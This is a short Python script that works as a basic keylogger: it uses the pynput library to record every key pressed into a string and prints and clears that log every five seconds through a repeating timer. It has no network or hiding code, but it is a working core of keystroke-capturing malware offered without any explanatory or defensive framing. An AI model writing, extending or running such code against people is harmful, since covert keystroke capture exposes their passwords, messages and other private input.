import pynput.keyboard
import threading

log = ''


def process_kay_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += ' '
        else:
            log += f' {key} '


def report():
    global log
    print(log)
    log = ''
    timer = threading.Timer(5, report)
    timer.start()


keyboard_listener = pynput.keyboard.Listener(on_press=process_kay_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
